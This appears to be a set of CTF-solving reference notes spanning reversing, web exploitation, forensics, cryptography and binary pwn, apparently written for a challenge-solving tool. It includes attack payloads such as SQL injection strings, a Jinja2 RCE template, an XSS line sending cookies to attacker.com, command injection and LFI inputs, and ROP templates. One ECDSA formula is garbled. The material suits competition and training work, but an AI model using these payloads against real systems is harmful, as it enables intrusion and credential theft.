title: Static Analysis of Compiled Binaries
content: For reverse engineering challenges, start with static analysis. Use 'file' to determine binary type, 'strings' to extract hardcoded strings (flags are often just obfuscated strings). Use 'ltrace' and 'strace' to trace library/system calls. Ghidra and radare2 provide decompilation and disassembly. Look for strcmp, memcmp, and similar functions that compare input to expected values. Use 'objdump -d' for disassembly. Check for XOR-encoded strings by looking for loops with XOR operations.

title: Baby Reverse Engineering Patterns
content: Baby/intro reversal challenges commonly hide flags in: (1) Plaintext strings extractable via 'strings' command, (2) XOR-encoded with single byte key - try all 256 XOR values on suspicious byte arrays, (3) Caesar cipher or rot-N encoding, (4) Base64 encoded strings. For ELF binaries, run './binary' and observe output, then try 'strings binary | grep ctf'. Check .rodata section with 'objdump -s -j .rodata binary'. Often the flag is passed to puts() or printf() - trace with ltrace. Also check with gdb: set breakpoint at main, step through, print string arguments.

title: Dynamic Analysis and Debugging
content: Use GDB for dynamic analysis: 'gdb ./binary', 'b main', 'run'. Use pwndbg or peda plugins for enhanced GDB. Useful commands: 'info functions' to list functions, 'disas <function>' to disassemble, 'x/s <addr>' to print strings. For patched jump conditions, modify ZF with 'set $eflags'. Use 'angr' for symbolic execution to find satisfying inputs. For Go/Rust binaries, symbols may still be present. For stripped binaries, focus on main() and function cross-references. radare2's 'aa' then 'pdf @main' gives analysis.

title: SQL Injection Techniques
content: Test for SQL injection with single quote ' and observe errors. Classic payloads: ' OR '1'='1, ' OR 1=1--, admin'--. Use UNION-based injection to extract data: ' UNION SELECT 1,2,3--. Use sqlmap for automated testing: 'sqlmap -u URL --dbs'. Blind SQL injection: use time-based with SLEEP() or boolean-based with AND 1=1. For login bypass: username admin'-- with any password. Check for second-order injection where stored data is used in queries without sanitization. Error-based extraction uses functions like extractvalue().

title: Web Application Fingerprinting and Enumeration
content: For web challenges: (1) Check page source for comments, hidden fields, JS files. (2) Look for robots.txt, .git directory disclosure, backup files like .bak or ~. (3) Use curl with verbose flag to see response headers (server version, X-Powered-By). (4) Test for LFI with ../../../etc/passwd. (5) Check cookies for base64-encoded data or JWT tokens. (6) Test for SSTI with {{7*7}} in input fields. (7) Directory enumeration with gobuster or dirb. (8) Look for path traversal in file download endpoints. JWT attacks: change alg to none or RS256 to HS256.

title: Web Exploitation - SSTI, XSS, and CSRF
content: Server-Side Template Injection (SSTI): test with {{7*7}}, ${7*7}, <%= 7*7 %>. For Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. For Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}. XSS: <script>document.location='http://attacker.com/?c='+document.cookie</script>. File upload bypass: change Content-Type header, use null bytes in filename, double extensions (.php.jpg). PHP-specific: test for type juggling with '0e' prefixes in MD5 comparisons. Object deserialization vulnerabilities in PHP/Java.

title: ShreeRamQuest Style Web Challenges
content: For quest-style web challenges involving multiple stages: (1) Follow redirects carefully with 'curl -L'. (2) Check query parameters for injection points. (3) Look for PHP include() vulnerabilities with user-controlled parameters - test with php://filter base64 wrappers. (4) Check for command injection in ping/host fields. (5) Look for file write-then-eval patterns. (6) Often involves chaining multiple small vulnerabilities. (7) Check for .htaccess misconfigurations. (8) Server-side includes (SSI) injection: <!--#exec cmd='id' -->. Check for GraphQL introspection at /graphql.

title: Forensics - File Analysis and Hidden Data
content: For forensics challenges: (1) Use 'file' command to identify type. (2) Use 'binwalk -e' to extract embedded files. (3) Check metadata with 'exiftool'. (4) Look for steganography: steghide, zsteg (PNG), stegsolve. (5) For images, check LSB steganography with 'zsteg image.png'. (6) Analyze network captures with Wireshark: filter by protocol, follow TCP streams, export HTTP objects. (7) For memory dumps, use Volatility framework. (8) Disk images: mount with 'mount -o loop disk.img /mnt' or use Autopsy. (9) Use 'strings' and 'grep' on raw files.

title: QR Code and Image Analysis in Forensics
content: For image-based forensics: (1) Try reading QR codes with 'zbarimg' or online decoders. (2) For corrupted PNG, check/fix magic bytes: 89 50 4E 47. (3) Use stegsolve to analyze color planes. (4) For black-and-white encoded data, convert binary sequences to ASCII. (5) If numbers represent pixel rows, reconstruct the image with PIL/Pillow: create image from binary data, each row being a binary number. (6) For 1black0white style: each decimal number is a row of pixels in binary form. Convert: bin(num).zfill(31) gives 31-pixel row. Use PIL.Image to recreate and scan QR code.

title: Network Forensics with Wireshark/pcap
content: For pcap analysis: (1) Open in Wireshark, check Statistics > Protocol Hierarchy. (2) Filter HTTP traffic: 'http', then File > Export HTTP Objects to get files. (3) Follow TCP streams: right-click > Follow > TCP Stream. (4) For DNS exfiltration, filter 'dns' and look for unusual subdomains. (5) Use tshark for command-line analysis: 'tshark -r file.pcap -Y http -T fields -e http.request.uri'. (6) USB captures: filter 'usb.data_len > 0', decode HID keyboard data. (7) For HTTP credentials, look in Authorization header or POST body. (8) Decrypt TLS if RSA key provided.

title: Classical and RSA Cryptography
content: For RSA challenges: (1) Small e attacks: if e=3 and message is small, m = cube_root(ciphertext). (2) Common modulus attack if same message encrypted with different keys. (3) Wiener's attack for small d: use continued fractions. (4) Factor n if vulnerable: use factordb.com or Fermat's method for close primes. (5) For classical ciphers, use frequency analysis. Vigenere uses Index of Coincidence. (6) For AES challenges: CBC bit-flipping, padding oracle attacks. (7) For hash challenges: use hashcat or john with wordlists. (8) Sage math for ECC and group theory computations.

title: Elliptic Curve Cryptography Attacks
content: For ECC (elliptic curve) challenges: (1) Check curve parameters for weaknesses - invalid curve attacks if not validating input. (2) Pohlig-Hellman if group order is smooth (small prime factors). (3) MOV attack: maps DLP to finite field. (4) Smart's attack if #E(Fp) = p (anomalous curve). (5) For ECDSA: if nonce k is reused or predictable, recover private key with d = (s1-s2)^{-1}*(r1*??) (6) For super_curve: likely involves solving discrete log in a small subgroup. Check if curve order factors nicely. Use sage: E = EllipticCurve(GF(p), [a,b]); E.order(); factor(). (7) Baby-step giant-step or Pollard's rho for small subgroups.

title: ECC Pohlig-Hellman and Discrete Log in Python/Sage
content: To solve ECDLP with Sage for CTF: E = EllipticCurve(GF(p), [a, b]); n = E.order(); factor(n). If n has small prime factors, use Pohlig-Hellman. For each prime factor q: DLP in subgroup of order q, then CRT. Sage code: from sage.groups.generic import discrete_log; k = discrete_log(target_point, base_point, ord=n, operation='+') -- uses BSGS/Pollard. For ECDSA nonce reuse: given (r,s1,m1) and (r,s2,m2): k=(m1-m2)*(s1-s2)^{-1} mod n, then d=(s*k-m)*r^{-1} mod n. Install sage: apt-get install sagemath. Run sage scripts: sage script.sage or sage -python script.py.

title: Buffer Overflow - Stack-based Exploits
content: For buffer overflow (pwn) challenges: (1) Identify overflow with cyclic pattern: 'cyclic 200' then check offset at crash. (2) Check security: 'checksec binary' - no NX means shellcode injection possible. (3) With NX but no ASLR: ret2libc attack, find system() and /bin/sh address. (4) With ASLR: ret2plt to leak libc address, then calculate offsets. (5) Stack canary bypass: if canary can be leaked via format string, overwrite after leak. (6) Return Oriented Programming (ROP): look for gadgets with ROPgadget or ropper. (7) pwntools template: from pwn import *; p=process('./binary'); payload=b'A'*offset+p64(ret_addr); p.sendline(payload).

title: Bigboy Style Pwn - Simple BOF Challenges
content: For bigboy/simple pwn challenges: (1) Usually straightforward stack overflow with no protections. (2) Run checksec: often no PIE, no stack canary, maybe NX off. (3) Find overflow offset with 'python3 -c print("A"*200)' or pwntools cyclic. (4) Common pattern: overflow to control return address or overwrite a local variable check. (5) If there's a win() function, redirect execution there. (6) For 32-bit: use p32() in pwntools, for 64-bit p64(). (7) Sample: from pwn import *; p=process('./bigboy'); payload=cyclic(64)+p64(win_addr); p.sendline(payload); p.interactive(). (8) Check for format string vulnerabilities too: %x %x %x to leak stack. For nc challenges: p=remote('host', port).

title: Heap Exploitation and Format String Attacks
content: Format string attacks: arbitrary read with %n$s (n=position), arbitrary write with %n$n. To find offset: send 'AAAA%x.%x.%x...' and look for 41414141. Heap exploitation: use after free, double free, heap overflow. Tools: pwndbg heap command shows heap layout. For malloc/free hooks: overwrite __malloc_hook with one_gadget address. One gadgets: 'one_gadget libc.so'. For libc leaks: use puts(got[puts]) to leak address, calculate libc base = leak - offset. Common gadgets: ret gadget for alignment, pop rdi; ret for first argument.

title: CTF General Methodology
content: General CTF solving methodology: (1) Read challenge description carefully, note file types given. (2) Identify category: rev=binary analysis, web=website exploitation, for=forensics/hidden data, cry=math/encryption, pwn=memory corruption. (3) Start broad: strings, file, binwalk on files. (4) Search for flag format: grep -r 'ctf{' or grep -r 'flag{'. (5) If stuck, try common tools for the category. (6) For network challenges, run tcpdump or analyze given pcap. (7) Check for encoding: base64, hex, rot13 on suspicious strings. (8) Use CyberChef for multi-layer decoding. (9) Flag format is usually stated in challenge description.

title: Common CTF Tools Reference
content: Essential CTF tools by category: REV: strings, file, objdump, radare2, ghidra, gdb, ltrace, strace, angr. WEB: curl, burp suite, sqlmap, nikto, gobuster, wfuzz, jwt_tool. FOR: binwalk, exiftool, steghide, zsteg, stegsolve, volatility, wireshark/tshark, foremost. CRY: sage, openssl, hashcat, john, rsatool, factordb. PWN: pwntools, gdb+pwndbg, checksec, ROPgadget, one_gadget. ALL: python3, CyberChef, gzip/zip/tar for archives. Docker environment has: gmpy2, sagemath, pwntools, radare2, gdb, sqlmap, nikto, sleuthkit pre-installed.

title: IDOR and Broken Access Control
content: Many web challenges hinge on accessing objects you shouldn't. Look for numeric or guessable IDs in URLs, cookies, and POST bodies (e.g. ?id=5, note_id, user=). Increment/decrement or swap them to reach other users' data (Insecure Direct Object Reference). Test whether admin-only endpoints work without auth, whether a normal cookie can view /admin, and whether changing a role/user field in a JWT or session grants access. Compare responses for authorized vs unauthorized requests. The flag is often in another user's or the admin's record.

title: Command Injection and Server-Side RCE
content: When a web app runs system commands with user input (ping tools, converters, filters), try shell metacharacters: ; | & && `cmd` $(cmd) and newlines to append commands, e.g. 127.0.0.1; cat /flag. If output is hidden (blind), exfiltrate via time delays (sleep), DNS, or writing to a web-readable path. Also test argument injection and unsafe use of eval/system/exec in PHP, Python, or Node. Read source (see .git disclosure) to find the sink. Once you have RCE, locate the flag with find / -name 'flag*' 2>/dev/null.

title: Source Disclosure via .git, Backups, and LFI
content: Web challenges that ship a src.tar.gz or a live site often leak their own source. Check for exposed /.git/ (dump with git-dumper or fetch /.git/HEAD, config, index and objects, then git checkout), editor backups (index.php~, .bak, .swp), and .DS_Store for filenames. Local File Inclusion (?page=../../../../etc/passwd, php://filter/convert.base64-encode/resource=index.php) can read source to find hardcoded secrets, flag paths, or logic flaws. Reading the source is usually the intended first step to understand the vulnerability.

title: Session, Cookie, and JWT Forgery
content: Authentication bypasses often come from tampering with session state. Decode cookies (base64, URL-encode, JSON) and look for role=user or isAdmin=false to flip. For signed tokens, test JWT weaknesses: alg:none, weak HMAC secrets crackable with hashcat/jwt_tool, or confusing RS256 with HS256 using the public key. PHP loose comparisons (== with '0e...' magic hashes, type juggling) and predictable 'remember me' tokens are common. Flask sessions signed with a guessable SECRET_KEY can be forged with flask-unsign. Forge an admin session to reach the flag.

title: ROP and ret2libc
content: When NX/DEP prevents running shellcode on the stack, chain existing code with Return-Oriented Programming. After a buffer overflow controls the return address, build a chain of gadgets (pop rdi; ret, etc. found with ropper/ROPgadget) to call system('/bin/sh') or execve. If ASLR is on, first leak a libc address (e.g. puts(puts@got)) to compute the libc base, then return to main and send a second-stage chain with the real system and /bin/sh offsets. Use pwntools ELF/ROP objects and a libc database (libc.blukat.me) to resolve offsets.

title: GOT Overwrite and Format String Exploitation
content: A format string bug (printf(user_input) with no format) leaks and writes memory. Use %p/%x to dump the stack and find offsets, %s to read pointers, and %n to write. Position your target address on the stack and use %<n>c width plus %<off>$n to write arbitrary values, overwriting a GOT entry (e.g. redirect printf or exit to system or a win function) or a saved return address. pwntools fmtstr_payload automates the writes. Combine with a leak to defeat ASLR/PIE. Partial overwrites help when you only need to change a few bytes.

title: Integer Overflow and Off-by-One
content: Not every pwn is a plain overflow. Look for signedness bugs (a negative length passed to memcpy becomes huge), integer overflow in size calculations (n*size wrapping to a small allocation), and off-by-one/null-byte overflows that corrupt the least-significant byte of a saved pointer or chunk size (poison-null-byte). These often set up a heap overlap or let you write one byte past a bound. Audit bounds checks that use signed ints or trust user-supplied lengths, and check how counts relate to buffer sizes.

title: Shellcode Injection and Kernel Pwn
content: When the stack or a mapped page is executable (no NX, or an RWX region/mmap), inject shellcode and jump to it; use pwntools shellcraft or a short execve('/bin/sh') stub, and a NOP sled or a jmp/call to a register pointing at your buffer. For kernel challenges (a vulnerable .ko/LKM with a provided main.c and Makefile), typical goals are calling commit_creds(prepare_kernel_cred(0)) via a controlled call, defeating SMEP/SMAP/KPTI, and returning to userland to spawn a root shell. Build the module, reproduce the bug locally under QEMU, then craft the privilege-escalation payload.

title: Anti-Debugging and Packed Binaries
content: If strings and a quick decompile show little, the binary may be packed or self-defending. Detect packers with 'file', high-entropy sections, and 'strings' hits like UPX!; unpack UPX with 'upx -d', or dump from memory after it unpacks itself. Common anti-debug tricks: ptrace(PTRACE_TRACEME) (patch it or LD_PRELOAD a fake ptrace), timing checks (rdtsc), /proc/self/status TracerPid, and int3 breakpoints detection. Patch the checks in Ghidra/radare2, set breakpoints after unpacking, or run under a debugger that hides itself. Then reverse the real logic.

title: Custom VM and Bytecode Reversing
content: Some rev challenges implement a small virtual machine: a dispatch loop reads 'opcodes' from an embedded byte array and runs handlers. Identify the fetch-decode-execute loop and a switch/jump table, then map each opcode to its operation (push, xor, cmp, jmp). Recover the bytecode program and either re-implement the VM in Python to understand the check, or symbolically execute it. The flag check is usually a sequence of VM instructions comparing transformed input to constants. Also watch for compile-time computed data (constexpr/templates) and interpreted languages compiled to custom bytecode.

title: Constraint Solving with angr and z3
content: For key-checkers that transform input and compare to a target, avoid reversing every operation by hand. Use angr to symbolically execute from the entry (or a specific function) with a symbolic input, then explore to the 'Correct'/success address while avoiding the 'Wrong' address; angr solves for the input that reaches it. Set the right base, hook slow libc calls, and constrain input to printable bytes. For pure arithmetic/bitwise checks, model the constraints directly in z3 and solve. This cracks many XOR/arithmetic and multi-stage checks quickly.

title: Disk Image and Filesystem Forensics
content: Given a disk or partition image (.img, .dd, .raw), identify it with 'file' and 'mmls'/'fdisk -l' for the partition layout. Mount read-only (mount -o ro,loop,offset=...) or use The Sleuth Kit: fls to list files (including deleted), icat to extract by inode, and tsk_recover to carve everything out. binwalk -e and foremost/photorec carve embedded files. Check unallocated space and slack for deleted data, look in /home, /root, browser history, and logs. The flag is often in a deleted file, an odd filename, or hidden in slack space.

title: Memory Forensics with Volatility
content: For a RAM capture (memory dump), use Volatility. Identify the profile (imageinfo / vol3 windows.info), then list processes (pslist, pstree, psscan for hidden/terminated), network connections (netscan), command history (cmdscan, consoles), and loaded modules. Dump a suspicious process (memdump/procdump) and run strings/grep for the flag. Extract files (filescan + dumpfiles), registry hives (hivelist, printkey), and clipboard. Malware and injected code show up via malfind. Many flags sit in a process's memory, a typed command, an environment variable, or a recovered file.

title: Archive Repair and Password Cracking
content: Broken or protected archives are common. For a corrupted zip, check/fix the header and central directory with zip -FF broken.zip --out fixed.zip, or repair magic bytes by hand (PK\x03\x04 local header, PK\x05\x06 end-of-central-directory) using a hex editor and the ZIP spec. For password-protected zip/rar/7z, extract a hash with zip2john/rar2john and crack with john or hashcat and a wordlist (rockyou). Beware known-plaintext attacks on legacy ZipCrypto (bkcrack) when you know part of a contained file. Nested archives and misidentified extensions (check 'file') are typical twists.

title: Git History and Document Forensics
content: When given a repository or a file that hides history, inspect version control and document internals. For git: git log --all, git reflog, git fsck --lost-found to find dangling commits/blobs, and git show/cat-file to read removed content, git stash list, and diffs where a secret was added then deleted. For documents: PDFs carry objects, streams, and metadata (pdfinfo, pdf-parser, peepdf, exiftool) that may hide the flag in an object, JavaScript, or incremental-update history; office files are zips (unzip, grep). Also check EXIF and embedded thumbnails in images. The flag often lives in a prior revision or a metadata field.
